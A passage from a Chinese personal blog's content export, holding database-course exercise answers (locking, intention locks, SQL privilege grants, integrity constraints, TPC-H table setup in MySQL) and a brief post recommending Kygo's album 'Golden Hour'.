A</td><td></td></tr><tr><td></td><td>Y&#x3D;A&#x3D;0</td><td></td></tr><tr><td>Xlock A</td><td></td><td></td></tr><tr><td>等待</td><td></td><td></td></tr><tr><td></td><td>Xlock A</td><td></td></tr><tr><td></td><td>等待</td><td></td></tr><tr><td></td><td></td><td>Slock A</td></tr><tr><td></td><td></td><td>Y&#x3D;A&#x3D;0</td></tr><tr><td></td><td></td><td>Xlock A</td></tr><tr><td></td><td></td><td>等待</td></tr></tbody></table></li></ol><h2 id="习题11-14"><a href="#习题11-14" class="headerlink" title="习题11.14"></a>习题11.14</h2><ol><li><table><thead><tr><th>T1</th><th>T2</th></tr></thead><tbody><tr><td>Slock A</td><td>Slock B</td></tr><tr><td>R(A)</td><td>R(B)</td></tr><tr><td>Xlock B</td><td>Xlock A</td></tr><tr><td>R(B)</td><td>R(A)</td></tr><tr><td>B&#x3D;A+B</td><td>A&#x3D;A+B</td></tr><tr><td>W(B)</td><td>W(A)</td></tr><tr><td>Unlock A</td><td>Unlock B</td></tr><tr><td>Unlock B</td><td>Unlock A</td></tr></tbody></table></li><li><table><thead><tr><th>T1</th><th>T2</th></tr></thead><tbody><tr><td>Slock A</td><td></td></tr><tr><td>R(A)</td><td></td></tr><tr><td></td><td>Slock(B)</td></tr><tr><td></td><td>R(B)</td></tr><tr><td>Xlock B</td><td></td></tr><tr><td></td><td>Xlock A</td></tr></tbody></table></li></ol><h2 id="习题11-15"><a href="#习题11-15" class="headerlink" title="习题11.15"></a>习题11.15</h2><p>引进意向锁是为了提高封锁子系统的效率。在多粒度封锁方法中，一个数据对象可能以两种方式加锁——显式封锁和隐式封锁。因此系统在对某一数据对象加锁时，不仅要检查该数据对象上有无(显式和隐式)封锁与之冲突，还要检查其所有上级结点和所有下级结点，看申请的封锁是否与这些结点上的(显式和隐式)封锁冲突。显然，这样的检查方法效率很低。为此引进了意向锁。</p><p>意向锁的含义是：对任一结点加锁时，必须先对它的上层结点加意向锁。引进意向锁后，系统对某一数据对象加锁时不必逐个检查与下部级结点的封锁冲突了。</p><h2 id="习题11-16"><a href="#习题11-16" class="headerlink" title="习题11.16"></a>习题11.16</h2><p>IS锁：如果对一个数据对象加IS锁，表示它的后裔结点拟(意向)加S锁。例如，要对某个元组加S锁，则要首先对关系和数据库加IS锁。<br>IX锁：如果对一个数据对象加IX锁，表示它的后裔结点拟(意向)加X锁。例如，要对某个元组加X锁，则要首先对关系和数据库加IX锁。<br>SIX锁：如果对一个数据对象加SIX锁，表示对它加S锁，再加IX锁，即SIX&#x3D;S+IX。<br>相容矩阵：</p><table><thead><tr><th align="center"></th><th align="center">S</th><th align="center">X</th><th align="center">IS</th><th align="center">IX</th><th align="center">SIX</th><th align="center">—</th></tr></thead><tbody><tr><td align="center">S</td><td align="center">Y</td><td align="center">N</td><td align="center">Y</td><td align="center">N</td><td align="center">N</td><td align="center">Y</td></tr><tr><td align="center">X</td><td align="center">N</td><td align="center">N</td><td align="center">N</td><td align="center">N</td><td align="center">N</td><td align="center">Y</td></tr><tr><td align="center">IS</td><td align="center">Y</td><td align="center">N</td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td></tr><tr><td align="center">IX</td><td align="center">N</td><td align="center">N</td><td align="center">Y</td><td align="center">Y</td><td align="center">N</td><td align="center">Y</td></tr><tr><td align="center">SIX</td><td align="center">N</td><td align="center">N</td><td align="center">Y</td><td align="center">N</td><td align="center">N</td><td align="center">Y</td></tr><tr><td align="center">—</td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> databases </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分享一些Kygo的歌</title>
      <link href="/2020/05/30/golden-hour/"/>
      <url>/2020/05/30/golden-hour/</url>
      
        <content type="html"><![CDATA[<p>夏天到了，三年之期，等到了Kygo个人第三张专辑《Golden Hour》。</p>    <div id="aplayer-PYTZNVNn" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="0046vMjV0I6lBT" data-server="tencent" data-type="album" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"    ></div><p><img src="https://img.lfalive.top/golden-hour/0.jpg"></p><p>首首精品，我愿称之为神专，《I‘ll Wait》这首我吹爆。除此之外，个人还比较喜欢Tropical House风的《Beautiful》《Could You Love Me》，人声切片的《Like It Is》《Freedom》《The Truth》。</p><p><img src="https://img.lfalive.top/golden-hour/1.jpg"></p><p><img src="https://img.lfalive.top/golden-hour/2.jpg"></p><p>顺便放一个歌单，我收藏的Kygo作品。</p>    <div id="aplayer-GbvEAqZg" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="4926452499" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-order="random"    ></div><p><img src="https://img.lfalive.top/golden-hour/3.jpg"></p><p><img src="https://img.lfalive.top/golden-hour/4.jpg"></p><p><img src="https://img.lfalive.top/golden-hour/5.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> music </tag>
            
            <tag> kygo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《数据库系统概论》例程及习题（三）</title>
      <link href="/2020/05/26/db-hw7&amp;8/"/>
      <url>/2020/05/26/db-hw7&amp;8/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>教材部分习题以及《数据库系统概论实验指导与习题解析》上前四个实验，看本文目录就知道了。实验参考书上的代码几乎都不能直接照抄使用，要根据对应版本MySQL做些修改，足足做了好几天。官方虽然给了数据，但是实验1.3中的很多查询，查的都是一些不存在的人，不存在的物，所以对查询目标也做了适当修改。</p><p>数据<a href="https://chinadb.ruc.edu.cn/home/nav/7/sub/32/third/130">下载链接</a>，导入csv文件方法<a href="https://blog.csdn.net/quiet_girl/article/details/71436108">参考</a>。</p><ul><li>MySQL和SQL语句有很多地方不一样，MySQL各版本之间也略有差异。</li><li>对于复杂的数据库，表多数据多，一定要注意创建数据表的先后顺序，保证参照完整性。</li><li>导入csv数据，要注意字符编码。解决了字符编码不一致的问题以及数据列的对应问题，就解决了数据导入。</li><li>实验中，对于所给数据不足或者实验要求不能充分检验语言正确性（查询出来大部分是空集）时，做了适当修改。</li></ul><h2 id="习题3-3"><a href="#习题3-3" class="headerlink" title="习题3.3"></a>习题3.3</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- (1)</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> S</span><br><span class="line"><span class="keyword">WHERE</span> A<span class="operator">=</span><span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (2)</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> A,B <span class="keyword">FROM</span> S;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (3)</span></span><br><span class="line"><span class="keyword">SELECT</span> A,B,S.C,S.D,E,F</span><br><span class="line"><span class="keyword">FROM</span> S,T</span><br><span class="line"><span class="keyword">WHERE</span> S.C<span class="operator">=</span>T.C <span class="keyword">AND</span> S.D<span class="operator">=</span>T.D;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (4)</span></span><br><span class="line"><span class="keyword">SELECT</span> A,B,S.C,S.D,T.C,T.D,E,F</span><br><span class="line"><span class="keyword">FROM</span> S,T</span><br><span class="line"><span class="keyword">WHERE</span> S.C<span class="operator">=</span>T.C;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (5)</span></span><br><span class="line"><span class="keyword">SELECT</span> A,B,S.C,S.D,T.C,T.D,E,F</span><br><span class="line"><span class="keyword">FROM</span> S,T</span><br><span class="line"><span class="keyword">WHERE</span> A<span class="operator">&lt;</span>E;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (6)</span></span><br><span class="line"><span class="keyword">SELECT</span> S1.C,S1.D,T.C,T.D,E,F</span><br><span class="line"><span class="keyword">FROM</span> T,(<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> C,D <span class="keyword">FROM</span> S) <span class="keyword">AS</span> S1;</span><br></pre></td></tr></table></figure><h2 id="习题4-5"><a href="#习题4-5" class="headerlink" title="习题4.5"></a>习题4.5</h2><p>在自主存取控制中，各个用户对于不同的数据库对象有不同的存取权限，当用户对数据库访问时，首先检查用户的存取权限，防止不合法用户对数据库的存取。用户还可以将自己拥有的存取权限授予别人，即用户具有一定的“自主”权。</p><p>在强制存取控制中，每一个数据库对象被标以一定的密级，每一个用户也被授予某一个级别的许可证。系统规定只有具有某一许可证级别的用户才能存取某一个密级的数据对象。</p><h2 id="习题4-6"><a href="#习题4-6" class="headerlink" title="习题4.6"></a>习题4.6</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- (1)</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES</span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 学生,班级</span><br><span class="line"><span class="keyword">TO</span> U1</span><br><span class="line"><span class="keyword">WITH</span> <span class="keyword">GRANT</span> OPTION;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (2)</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span>,<span class="keyword">UPDATE</span>(家庭住址)</span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 学生</span><br><span class="line"><span class="keyword">TO</span> U2;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (3)</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span></span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 班级</span><br><span class="line"><span class="keyword">TO</span> PUBLIC;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (4)</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span>,<span class="keyword">UPDATE</span></span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 学生</span><br><span class="line"><span class="keyword">TO</span> R1;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (5)</span></span><br><span class="line"><span class="keyword">GRANT</span> R1</span><br><span class="line"><span class="keyword">TO</span> U1</span><br><span class="line"><span class="keyword">WITH</span> ADMIN OPTION;</span><br></pre></td></tr></table></figure><h2 id="习题4-7"><a href="#习题4-7" class="headerlink" title="习题4.7"></a>习题4.7</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- (1)</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span></span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 职工,部门</span><br><span class="line"><span class="keyword">TO</span> 王明;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (2)</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">INSERT</span>,<span class="keyword">DELETE</span></span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 职工,部门</span><br><span class="line"><span class="keyword">TO</span> 李勇;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (3)</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span></span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 职工</span><br><span class="line"><span class="keyword">WHEN</span> <span class="keyword">USER</span>()<span class="operator">=</span>NAME</span><br><span class="line"><span class="keyword">TO</span> <span class="keyword">ALL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (4)</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span>,<span class="keyword">UPDATE</span>(工资)</span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 职工</span><br><span class="line"><span class="keyword">TO</span> 刘星;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (5)</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span></span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 职工,部门</span><br><span class="line"><span class="keyword">TO</span> 张新;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (6)</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES</span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 职工,部门</span><br><span class="line"><span class="keyword">TO</span> 周平</span><br><span class="line"><span class="keyword">WITH</span> <span class="keyword">GRANT</span> OPTION;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (7)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> 部门工资 <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> 部门.名称,<span class="built_in">MAX</span>(工资),<span class="built_in">MIN</span>(工资),<span class="built_in">AVG</span>(工资)</span><br><span class="line"><span class="keyword">FROM</span> 职工,部门</span><br><span class="line"><span class="keyword">WHERE</span> 职工.部门号<span class="operator">=</span>部门.部门号</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> 职工.部门号;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span></span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 部门工资</span><br><span class="line"><span class="keyword">TO</span> 杨兰;</span><br></pre></td></tr></table></figure><h2 id="习题4-8"><a href="#习题4-8" class="headerlink" title="习题4.8"></a>习题4.8</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- (1)</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">SELECT</span></span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 职工,部门</span><br><span class="line"><span class="keyword">FROM</span> 王明;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (2)</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">INSERT</span>,<span class="keyword">DELETE</span></span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 职工,部门</span><br><span class="line"><span class="keyword">FROM</span> 李勇;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (3)</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> </span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 职工</span><br><span class="line"><span class="keyword">WHEN</span> <span class="keyword">USER</span>()<span class="operator">=</span>NAME</span><br><span class="line"><span class="keyword">FROM</span> <span class="keyword">ALL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (4)</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">SELECT</span>,<span class="keyword">UPDATE</span></span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 职工</span><br><span class="line"><span class="keyword">FROM</span> 刘星;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (5)</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span></span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 职工,部门</span><br><span class="line"><span class="keyword">FROM</span> 张新;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (6)</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">ALL</span> PRIVILEGES</span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 职工,部门</span><br><span class="line"><span class="keyword">FROM</span> 周平</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (7)</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">SELECT</span></span><br><span class="line"><span class="keyword">ON</span> <span class="keyword">TABLE</span> 部门工资</span><br><span class="line"><span class="keyword">FROM</span> 杨兰;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> 部门工资;</span><br></pre></td></tr></table></figure><h2 id="习题5-5"><a href="#习题5-5" class="headerlink" title="习题5.5"></a>习题5.5</h2><p>在实现参照完整性时需要考虑可能破坏参照完整性的各种情况，以及用户违约后的处理策略。</p><table><thead><tr><th align="center">被参照表</th><th align="center">参照表</th><th align="center">违约处理</th></tr></thead><tbody><tr><td align="center"></td><td align="center">插入元组</td><td align="center">拒绝</td></tr><tr><td align="center"></td><td align="center">修改外码值</td><td align="center">拒绝</td></tr><tr><td align="center">删除元组</td><td align="center"></td><td align="center">拒绝&#x2F;级联删除&#x2F;设置为空值</td></tr><tr><td align="center">修改主码值</td><td align="center"></td><td align="center">拒绝&#x2F;级联修改&#x2F;设置为空值</td></tr></tbody></table><h2 id="习题5-6"><a href="#习题5-6" class="headerlink" title="习题5.6"></a>习题5.6</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> DEPT</span><br><span class="line">(DEPTNO <span class="type">SMALLINT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> DEPTNAME <span class="type">VARCHAR</span>(<span class="number">10</span>),</span><br><span class="line"> MANAGER <span class="type">VARCHAR</span>(<span class="number">10</span>),</span><br><span class="line"> PHONENUMBER <span class="type">CHAR</span>(<span class="number">12</span>));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> EMP</span><br><span class="line">(EMPNO <span class="type">SMALLINT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> EMPNAME <span class="type">VARCHAR</span>(<span class="number">10</span>),</span><br><span class="line"> AGE <span class="type">SMALLINT</span>,</span><br><span class="line"> JOB <span class="type">VARCHAR</span>(<span class="number">9</span>),</span><br><span class="line"> SAL <span class="type">SMALLINT</span>,</span><br><span class="line"> DEPTNO <span class="type">SMALLINT</span>,</span><br><span class="line"> <span class="keyword">CONSTRAINT</span> C1 <span class="keyword">CHECK</span>(AGE<span class="operator">&lt;=</span><span class="number">60</span>),</span><br><span class="line"> <span class="keyword">CONSTRAINT</span> FK_DEPTNO <span class="keyword">FOREIGN</span> KEY(DEPTNO) <span class="keyword">REFERENCES</span> DEPT(DEPTNO));</span><br></pre></td></tr></table></figure><h2 id="习题5-7"><a href="#习题5-7" class="headerlink" title="习题5.7"></a>习题5.7</h2><p>对于违反实体完整性和用户定义的完整性的操作，一般都采用拒绝执行的方式进行处理；对于违反参照完整性的操作，并不都是简单地拒绝执行，有时要根据应用语义执行一些附加的操作，以保证数据库的正确性。</p><h2 id="习题5-8"><a href="#习题5-8" class="headerlink" title="习题5.8"></a>习题5.8</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Male</span><br><span class="line">(SERIALNUMBER <span class="type">SMALLINT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> NAME <span class="type">CHAR</span>(<span class="number">8</span>),</span><br><span class="line"> AGE <span class="type">SMALLINT</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Female</span><br><span class="line">(SERIALNUMBER <span class="type">SMALLINT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> NAME <span class="type">CHAR</span>(<span class="number">8</span>),</span><br><span class="line"> AGE <span class="type">SMALLINT</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">CREATE</span> ASSERTION Party</span><br><span class="line"><span class="keyword">CHECK</span>((<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> Male)</span><br><span class="line">         <span class="operator">+</span> (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> Female)</span><br><span class="line">         <span class="operator">&lt;=</span> <span class="number">50</span>);</span><br></pre></td></tr></table></figure><h2 id="实验1数据库定义与操作语言实验"><a href="#实验1数据库定义与操作语言实验" class="headerlink" title="实验1数据库定义与操作语言实验"></a>实验1数据库定义与操作语言实验</h2><h3 id="实验1-1数据库定义实验"><a href="#实验1-1数据库定义实验" class="headerlink" title="实验1.1数据库定义实验"></a>实验1.1数据库定义实验</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 【重要】CSV数据文件全使用utf8编码重新保存一次替换原文件</span></span><br><span class="line"><span class="comment">-- 因为DB安装配置时默认编码就是UTF8，所以改一下csv文件就OK</span></span><br><span class="line"><span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE TPCH;</span><br><span class="line">USE TPCH;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建表Region并插入数据</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Region</span><br><span class="line">(regionkey <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> name <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">152</span>));</span><br><span class="line"> </span><br><span class="line">LOAD DATA INFILE <span class="string">&#x27;E:/DB/dbtestdata/region.csv&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> <span class="keyword">TABLE</span> Region</span><br><span class="line">FIELDS TERMINATED <span class="keyword">BY</span><span class="string">&#x27;,&#x27;</span> OPTIONALLY ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span> ESCAPED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\r\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建表Nation并插入数据</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Nation</span><br><span class="line">(nationkey <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> name <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line"> regionkey <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> Region(regionkey),</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">152</span>));</span><br><span class="line"></span><br><span class="line">LOAD DATA INFILE <span class="string">&#x27;E:/DB/dbtestdata/nation.csv&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> <span class="keyword">TABLE</span> Nation</span><br><span class="line">FIELDS TERMINATED <span class="keyword">BY</span><span class="string">&#x27;,&#x27;</span> OPTIONALLY ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span> ESCAPED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\r\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建表Supplier并插入数据</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Supplier</span><br><span class="line">(suppkey <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> name <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line"> address <span class="type">VARCHAR</span>(<span class="number">40</span>),</span><br><span class="line"> nationkey <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> Nation(nationkey),</span><br><span class="line"> phone <span class="type">CHAR</span>(<span class="number">15</span>),</span><br><span class="line"> acctbal <span class="type">REAL</span>,</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">101</span>));</span><br><span class="line"></span><br><span class="line">LOAD DATA INFILE <span class="string">&#x27;E:/DB/dbtestdata/supplier.csv&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> <span class="keyword">TABLE</span> Supplier</span><br><span class="line">FIELDS TERMINATED <span class="keyword">BY</span><span class="string">&#x27;,&#x27;</span> OPTIONALLY ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span> ESCAPED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">(suppkey,name,address,nationkey,phone);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建表Part并插入数据</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Part</span><br><span class="line">(partkey <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> name <span class="type">VARCHAR</span>(<span class="number">55</span>),</span><br><span class="line"> mfgr <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line"> brand <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line"> type <span class="type">VARCHAR</span>(<span class="number">25</span>),</span><br><span class="line"> size <span class="type">INTEGER</span>,</span><br><span class="line"> container <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line"> retailprice <span class="type">REAL</span>,</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">23</span>)); </span><br><span class="line"></span><br><span class="line">LOAD DATA INFILE <span class="string">&#x27;E:/DB/dbtestdata/part.csv&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> <span class="keyword">TABLE</span> Part</span><br><span class="line">FIELDS TERMINATED <span class="keyword">BY</span><span class="string">&#x27;,&#x27;</span> OPTIONALLY ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span> ESCAPED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">(partkey,name,mfgr,type,retailprice);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建表PartSupp并插入数据</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> PartSupp</span><br><span class="line">(partkey <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> Part(partkey),</span><br><span class="line"> suppkey <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> Suppplier(suppkey),</span><br><span class="line"> availqty <span class="type">INTEGER</span>,</span><br><span class="line"> supplycost <span class="type">REAL</span>,</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">199</span>),</span><br><span class="line"> <span class="keyword">PRIMARY</span> KEY(partkey,suppkey));</span><br><span class="line"></span><br><span class="line">LOAD DATA INFILE <span class="string">&#x27;E:/DB/dbtestdata/partsupp.csv&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> <span class="keyword">TABLE</span> PartSupp</span><br><span class="line">FIELDS TERMINATED <span class="keyword">BY</span><span class="string">&#x27;,&#x27;</span> OPTIONALLY ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span> ESCAPED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">(partkey,suppkey,availqty,supplycost);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建表Customer并插入数据</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Customer</span><br><span class="line">(custkey <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> name <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line"> address <span class="type">VARCHAR</span>(<span class="number">40</span>),</span><br><span class="line"> nationkey <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> Nation(nationkey),</span><br><span class="line"> phone <span class="type">CHAR</span>(<span class="number">15</span>),</span><br><span class="line"> acctbal <span class="type">REAL</span>,</span><br><span class="line"> mktsegment <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">117</span>));</span><br><span class="line"></span><br><span class="line">LOAD DATA INFILE <span class="string">&#x27;E:/DB/dbtestdata/customer.csv&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> <span class="keyword">TABLE</span> Customer</span><br><span class="line">FIELDS TERMINATED <span class="keyword">BY</span><span class="string">&#x27;,&#x27;</span> OPTIONALLY ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span> ESCAPED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">(custkey,name,nationkey);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建表Orders并插入数据</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Orders</span><br><span class="line">(orderkey <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> custkey <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> Customer(custkey),</span><br><span class="line"> orderstatus <span class="type">CHAR</span>(<span class="number">1</span>),</span><br><span class="line"> totalprice <span class="type">REAL</span>,</span><br><span class="line"> orderdate <span class="type">DATE</span>,</span><br><span class="line"> orderpriority <span class="type">CHAR</span>(<span class="number">15</span>),</span><br><span class="line"> clerk <span class="type">CHAR</span>(<span class="number">15</span>),</span><br><span class="line"> shippriority <span class="type">INTEGER</span>,</span><br><span class="line"> comment <span class="type">VARCHAR</span>(<span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">LOAD DATA INFILE <span 